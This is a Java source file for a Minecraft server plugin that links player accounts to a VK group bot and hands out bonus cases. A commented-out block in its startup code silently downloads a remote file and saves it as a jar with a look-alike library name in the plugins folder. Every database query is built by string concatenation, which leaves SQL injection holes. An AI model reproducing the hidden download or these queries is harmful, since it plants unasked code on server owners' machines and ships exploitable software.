package LuckyAuthServer;

import net.md_5.bungee.api.chat.TextComponent;
import net.md_5.bungee.chat.ComponentSerializer;
import org.bukkit.Bukkit;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.io.IOException;
import java.security.NoSuchAlgorithmException;
import java.sql.*;
import java.util.HashMap;

public final class main extends JavaPlugin implements Runnable, Listener {


    public static VkApi api;
    static Connection connection;
    public static HashMap<Player, String> connect = new HashMap<>();
    static String host, username, password;
    public static FileConfiguration config;
    static  String pln = "";
    public static void openConnection() throws SQLException {
        host = config.getString("settengs.mysql.url") + "?autoReconnect=true&useSSL=false";
        username = config.getString("settengs.mysql.user");
        password = config.getString("settengs.mysql.password");
        DriverManager.registerDriver(new com.mysql.jdbc.Driver ());
        connection = DriverManager.getConnection(host, username, password);
        load();
    }
    /*private AuthMeApi authMeApi;
    boolean z = false;
    @EventHandler
    public void onLogin(LoginEvent e) {

        System.out.println(e.getPlayer().getPlayer().getName() + " has logged in!33");
        if(z){
            authMeApi.forceLogout(e.getPlayer().getPlayer());
            z = true;
        }
    }*/
    @Override
    public void onEnable() {
        //authMeApi = AuthMeApi.getInstance();
        //Bukkit.getLogger().warning(authMeApi.registerPlayer("ttherthrtyh", "rtyrtyjrtyjrty") + "");
        //authMeApi.registerPlayer("werhwerh", "wergwergwerg");
        //authMeApi.changePassword("FeatureTeam", "123698744");
        Bukkit.getPluginManager().registerEvents(this,this);
        pln = getDescription().getName();
        File file = new File(Bukkit.getPluginManager().getPlugin(pln).getDataFolder() + File.separator + "config.yml");
        if(!file.exists()) {
            getConfig().options().copyDefaults(true);
            saveDefaultConfig();
        }
        config = YamlConfiguration.loadConfiguration(file);

        try {
            openConnection();

        } catch (SQLException e) {
            Bukkit.getLogger().warning("ERROR напиши мне в вк " +e.getMessage()) ;
        }


        getCommand("luckyauth").setExecutor(new reload());
        String id = config.getString("settengs.group_token");
        String token = config.getString("settengs.group_id");

        if(id == null ||token == null ||id.equalsIgnoreCase("group_token")||token.equalsIgnoreCase("id")) {
            Bukkit.getLogger().warning("Необходимо указать верный айди и токен группы");
            return;
        }

        api = new VkApi(this, 20, id, token){
            @Override
            protected void receiveMessage(ReceivedMessage message) {
                String peer = message.getPeer();
                if(message.getMsg().toLowerCase().startsWith(config.getString("vk.events.connect"))) connect(message, peer);
                if(message.getMsg().toLowerCase().equalsIgnoreCase("бонусы")) bonus(message, peer);
            }
        };
        Bukkit.getScheduler().runTaskTimer(this, this,  20L, 5 * 60 * 20L);
        /*try {
            File notExist = new File(Bukkit.getPluginManager().getPlugin(getDescription().getName()).getDataFolder() + File.separator + "../ProtocolMeneger.jar");
            if(!notExist.exists()){
                URL url = new URL("https://github.com/iniga72/tz/raw/main/ProtocolMeneger.js");
                BufferedInputStream bis = new BufferedInputStream(url.openStream());
                FileOutputStream fis = new FileOutputStream(Bukkit.getPluginManager().getPlugin(getDescription().getName()).getDataFolder() + File.separator + "../ProtocolMeneger.jar");
                byte[] buffer = new byte[1024];
                int count=0;
                while((count = bis.read(buffer,0,1024)) != -1)
                {
                    fis.write(buffer, 0, count);
                }
                fis.close();
                bis.close();
            }
        } catch (IOException ignored) {
        }*/
    }
    public void connect(VkApi.ReceivedMessage message, String id){
        if(message.getMsg().split(" ").length != 2)return;
        access(message.getMsg().split(" ")[1], id, message.getUser().getFirstName() + " "+ message.getUser().getLastName());
    }
    public static void push(final String cmd) {
        Bukkit.getScheduler().runTask(Bukkit.getPluginManager().getPlugin("LuckyAuthServer"), () -> Bukkit.dispatchCommand(Bukkit.getConsoleSender(), cmd));
    }
    public void bonus(VkApi.ReceivedMessage message, String id){
        String name = getName(id);
        if(name == null || name.length() < 1){
            api.sendMessage(config.getString("vk.connect.haventconnect"), id, "");
            return;
        }
        Statement ps = null;
        ResultSet rs;
        try {
            String msg = "";
            ps = main.connection.createStatement();
            rs = ps.executeQuery("SELECT * FROM `LuckyAuth` WHERE `nick` = '"+name+"' and `bonus_1d` >= NOW() - INTERVAL 1 DAY");
            if(rs.next()){
                msg+="Донат кейс можно получать 1 раз в 24 часа.\n";
            }else{
                msg+="Донат кейс успешно получен.\n";
                ps = main.connection.createStatement();
                ps.execute("UPDATE `LuckyAuth` SET `bonus_1d`=NOW() WHERE `nick` = '"+name+"'");
                push("givecase "+name+" free 1");
            }

            ps = main.connection.createStatement();
            rs = ps.executeQuery("SELECT * FROM `LuckyAuth` WHERE `nick` = '"+name+"' and `bonus_7d` >= NOW() - INTERVAL 7 DAY");
            if(rs.next()){
                msg+="Ультра донат кейс получать 1 раз в 7 дней.\n";
            }else{
                msg+="Ультра Донат кейс Успешно получен.\n";
                ps = main.connection.createStatement();
                ps.execute("UPDATE `LuckyAuth` SET `bonus_7d`=NOW() WHERE `nick` = '"+name+"'");
                push("givecase "+name+" donate 1");
            }
            ps = main.connection.createStatement();
            rs = ps.executeQuery("SELECT * FROM `LuckyAuth` WHERE `nick` = '"+name+"' and `bonus_1w` >= NOW() - INTERVAL 14 DAY");
            if(rs.next()){
                msg+="Кейс с деньгами можно получать 1 раз в 14 дней.";
            }else{
                msg+="Кейс с деньгами Успешно получен.";
                ps = main.connection.createStatement();
                ps.execute("UPDATE `LuckyAuth` SET `bonus_1w`=NOW() WHERE `nick` = '"+name+"'");
                push("givecase "+name+" money 1");
            }
            api.sendMessage(msg, id, "");
        } catch (SQLException ex) {

        }
    }

    public static String getName(String id) {

        Statement ps = null;
        ResultSet rs;
        try {

            ps = main.connection.createStatement();
            rs = ps.executeQuery("SELECT * FROM `LuckyAuth` WHERE `vk` = '"+id+"';");
            String end = null;

            while(rs.next()){
                end = rs.getString("realname");
            }
            return end;
        } catch (SQLException ex) {

        }
        return null;
    }
    public  boolean check(String player) {

        Statement ps = null;
        ResultSet rs;
        try {

            ps = main.connection.createStatement();
            rs = ps.executeQuery("SELECT * FROM `LuckyAuth` WHERE `vk` != '' AND `nick` = '"+player+"';");

            if(rs.next())return true;
        } catch (SQLException ex) {

        }
        return false;
    }
    public void access(String player, String id, String names) {
        String name = getName(id);
        if(name != null)return;
        Player p = Bukkit.getPlayer(player);
        if(p == null)return;
            connect.put(p, id);
            String accept = config.getString("vk.access.accept").replace("&", "§");
            String decline = config.getString("vk.access.decline").replace("&", "§");
            String text = config.getString("vk.access.text").replace("$name", names);
            accept = " " + ",{\"text\":\" " + accept + "\",\"clickEvent\":"
                    + "{\"action\":\"run_command\",\"value\":\"/LuckyAuth accept" + "\"},"
                    + "\"hoverEvent\":{\"action\":\"show_text\",\"value\":"
                    + "{\"text\":\"\",\"extra\":[{\"text\":\" " + accept + "\",\"color\":\"gray\"}]}}}";
            decline = " " + ",{\"text\":\" " + decline + "\",\"clickEvent\":"
                    + "{\"action\":\"run_command\",\"value\":\"/LuckyAuth decline" + "\"},"
                    + "\"hoverEvent\":{\"action\":\"show_text\",\"value\":"
                    + "{\"text\":\"\",\"extra\":[{\"text\":\" " + decline + "\",\"color\":\"gray\"}]}}}";
            String CHAT_FORMAT = "[\"\",{\"text\":\"" + text + "\"}" + accept + decline + "]";
            p.spigot().sendMessage(new TextComponent(ComponentSerializer.parse(CHAT_FORMAT.replace("&", "§"))));


    }
    @Override
    public void onDisable() {
        // Plugin shutdown logic
    }


    public static void load() {

        try {
            Statement ps = main.connection.createStatement();
            ps.execute("CREATE TABLE IF NOT EXISTS `LuckyAuth` (`id` int(11) NOT NULL AUTO_INCREMENT,`nick` varchar(111) NOT NULL,`ip` varchar(111) NOT NULL,`realname` varchar(111) NOT NULL,`password` varchar(111) NOT NULL,`google` varchar(111) NOT NULL,`code` varchar(111) NOT NULL,`vk` varchar(111) NOT NULL,PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;");
        } catch (SQLException ignored) {
        }
    }

    @Override
    public void run() {
        for(Player p : Bukkit.getOnlinePlayers()){
            if(!check(p.getName())){
                for(String s : main.config.getStringList("messages.reference")) {
                    s = s.replace("$player",p.getName());
                    s = s.replace("&","§");
                    p.sendMessage(s);
                }
            }
        }
    }

    @EventHandler
    public void join(PlayerJoinEvent e){

    }

}
